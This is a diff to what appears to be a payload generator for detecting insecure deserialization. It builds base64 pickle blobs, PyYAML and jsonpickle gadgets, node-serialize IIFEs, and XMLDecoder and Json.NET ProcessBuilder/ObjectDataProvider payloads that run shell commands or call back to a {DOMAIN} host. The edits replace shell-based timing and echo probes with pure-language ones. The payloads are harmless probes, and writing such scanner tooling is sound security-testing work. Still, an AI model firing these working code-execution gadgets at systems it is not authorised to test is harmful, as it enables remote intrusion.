@@ -57,9 +57,9 @@ def python_pickle():
     header("Python Pickle P0 - Math (eval 7*191)")
     p(base64.b64encode(b"c__builtin__\neval\n(S'7*191'\ntR.").decode())
 
-    # P0 - Timing: sleep 5 causes >4500ms
-    header("Python Pickle P0 - Timing (sleep 5)")
-    p(base64.b64encode(b"cos\nsystem\n(S'sleep 5'\ntR.").decode())
+    # P0 - Timing: time.sleep(5) causes >4500ms (pure Python, no OS commands)
+    header("Python Pickle P0 - Timing (time.sleep 5)")
+    p(base64.b64encode(b"ctime\nsleep\n(I5\ntR.").decode())
 
     # P0 - OOB: use Python stdlib urllib (no shell commands needed)
     header("Python Pickle P0 - OOB urllib")
@@ -77,17 +77,17 @@ def python_pickle():
     header("Python Pickle P0 - Error (bad import)")
     p(base64.b64encode(b"c__builtin__\n__import__\n(S'invalid_module_1337'\ntR.").decode())
 
-    # P0 - Math: subprocess.check_output returns b'1337\n'
-    header("Python Pickle P0 - Math (subprocess echo 1337)")
-    p(base64.b64encode(b"csubprocess\ncheck_output\n(S'echo 1337'\nI01\ntR.").decode())
+    # P0 - Math: eval('str(7*191)') returns '1337' (pure Python, no subprocess)
+    header("Python Pickle P0 - Math (eval str(7*191))")
+    p(base64.b64encode(b"c__builtin__\neval\n(S'str(7*191)'\ntR.").decode())
 
     # P2 - Math
     header("Python Pickle P2 - Math (eval 7*191)")
     p(gen_pickle_p2('builtins', 'eval', '7*191'))
 
-    # P2 - Timing
-    header("Python Pickle P2 - Timing (sleep 5)")
-    p(gen_pickle_p2('posix', 'system', 'sleep 5'))
+    # P2 - Timing (pure Python, no OS commands)
+    header("Python Pickle P2 - Timing (time.sleep 5)")
+    p(gen_pickle_p2('time', 'sleep', 5))
 
     # P2 - OOB via eval+urllib (stdlib)
     header("Python Pickle P2 - OOB urllib")
@@ -105,12 +105,12 @@ def python_pickle():
     header("Python Pickle P4 - Math (eval 7*191)")
     p(base64.b64encode(pickle.dumps(E4(), protocol=4)).decode())
 
-    # P4 - Timing
+    # P4 - Timing (pure Python, no OS commands)
     class T4:
         def __reduce__(self):
-            import os
-            return (os.system, ('sleep 5',))
-    header("Python Pickle P4 - Timing (sleep 5)")
+            import time
+            return (time.sleep, (5,))
+    header("Python Pickle P4 - Timing (time.sleep 5)")
     p(base64.b64encode(pickle.dumps(T4(), protocol=4)).decode())
 
     # P4 - OOB via eval+urllib
@@ -127,10 +127,10 @@ def python_pickle():
 def python_yaml():
     header("Python YAML - Math (eval 7*191)")
     p('!!python/object/apply:builtins.eval ["7*191"]')
-    header("Python YAML - Math (subprocess echo 1337)")
-    p('!!python/object/apply:subprocess.check_output [["echo","1337"]]')
-    header("Python YAML - Timing (sleep 5)")
-    p('!!python/object/apply:os.system ["sleep 5"]')
+    header("Python YAML - Math (eval str(7*191))")
+    p('!!python/object/apply:builtins.eval ["str(7*191)"]')
+    header("Python YAML - Timing (time.sleep 5)")
+    p('!!python/object/apply:time.sleep [5]')
     header("Python YAML - OOB urllib")
     p(f'!!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen(\'http://{DOMAIN}/yaml\')"]')
     header("Python YAML - OOB DNS")
@@ -149,8 +149,8 @@ def python_yaml():
 def python_jsonpickle():
     header("Python jsonpickle - Math (eval 7*191)")
     p('{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["7*191"]}]}')
-    header("Python jsonpickle - Math (subprocess echo 1337)")
-    p('{"py/reduce":[{"py/function":"subprocess.check_output"},{"py/tuple":[["echo","1337"]]}]}')
+    header("Python jsonpickle - Math (eval str(7*191))")
+    p('{"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["str(7*191)"]}]}')
     header("Python jsonpickle - Timing (sleep 5)")
     p('{"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}')
     header("Python jsonpickle - Error (1/0)")
@@ -194,8 +194,8 @@ def node_js():
     # node-serialize - _$$ND_FUNC$$_ with IIFE
     header("Node node-serialize - Math (return 7*191)")
     p('{"rce":"_$$ND_FUNC$$_function(){return 7*191}()"}')
-    header("Node node-serialize - Timing (sleep 5)")
-    p('{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'sleep 5\')}()"}')
+    header("Node node-serialize - Timing (blocking 5s)")
+    p('{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}')
     header("Node node-serialize - OOB http.get")
     p(f'{{"rce":"_$$ND_FUNC$$_function(){{require(\'http\').get(\'http://{DOMAIN}/nodeser\')}}()"}}')
     header("Node node-serialize - Math (eval 7*191)")
@@ -209,9 +209,9 @@ def node_js():
     header("Node js-yaml - Error (bad regexp)")
     p('!!js/regexp /[invalid/')
 
-    # funcster - needs funcster.deepDeserialize() to execute
-    header("Node funcster - Error (invalid code)")
-    p('{"__js":"throw new Error(1337)"}')
+    # funcster - needs funcster.deepDeserialize() + function invocation
+    header("Node funcster - Math (7*191)")
+    p('{"fn":{"__js_function":"function(){return 7*191}"}}')
 
     # cryo - prototype pollution + _$$ND_FUNC$$_ IIFE auto-invokes via node-serialize
     header("Node cryo - Error (proto pollution)")
@@ -354,8 +354,8 @@ def java_snakeyaml():
 # Java XMLDecoder - math/timing/OOB/error via ProcessBuilder
 # ==========================================================================
 def java_xmldecoder():
-    header("XMLDecoder - Math (echo 1337)")
-    p(f'<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>echo 1337</string></void></array><void method="start"/></object></java>')
+    header("XMLDecoder - Math (expr 7*191)")
+    p(f'<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/sh</string></void><void index="1"><string>-c</string></void><void index="2"><string>expr 7 \\* 191</string></void></array><void method="start"/></object></java>')
     header("XMLDecoder - Timing (sleep 5)")
     p('<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>')
     header("XMLDecoder - OOB URL.openStream")
@@ -385,8 +385,8 @@ def dotnet():
     # Json.NET TypeNameHandling
     header(".NET Json.NET - OOB (nslookup)")
     p(f'{{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{{"$type":"System.Diagnostics.Process, System","StartInfo":{{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{DOMAIN}"}}}}}}')
-    header(".NET Json.NET - Math (echo 1337)")
-    p('{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}')
+    header(".NET Json.NET - Math (set /a 7*191)")
+    p('{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}')
     header(".NET Json.NET - Timing (timeout 5)")
     p('{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}')
     header(".NET Json.NET - OOB (AssemblyInstaller UNC)")
@@ -413,7 +413,7 @@ def dotnet():
 
     # JavaScriptSerializer
     header(".NET JavaScriptSerializer - Error (ObjectDataProvider)")
-    p('{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}')
+    p('{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c set /a 7*191"}}}')
 
     # LosFormatter
     header(".NET LosFormatter - Error (truncated)")
